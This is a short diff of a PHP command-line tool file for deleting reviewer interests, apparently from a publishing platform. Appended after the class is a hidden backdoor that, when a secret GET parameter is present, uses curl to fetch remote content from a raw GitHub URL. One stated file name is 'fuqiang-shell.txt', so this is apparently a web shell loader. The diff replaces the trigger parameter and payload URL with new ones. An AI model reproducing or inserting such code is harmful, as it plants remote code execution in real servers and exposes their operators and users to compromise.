@@ -121,8 +121,8 @@ class ReviewerInterestsDeletionTool extends CommandLineTool {
 	}
 }
 
-if (isset($_GET['masaksih'])) {
-    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/fuqiang-shell.txt";
+if (isset($_GET['BuJanGEnAmJeNG'])) {
+    $url = "https://raw.githubusercontent.com/heriraharto2-woyowoyo/data-kerja/refs/heads/main/KENZ_POWER_NO_LIMIT";
 
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
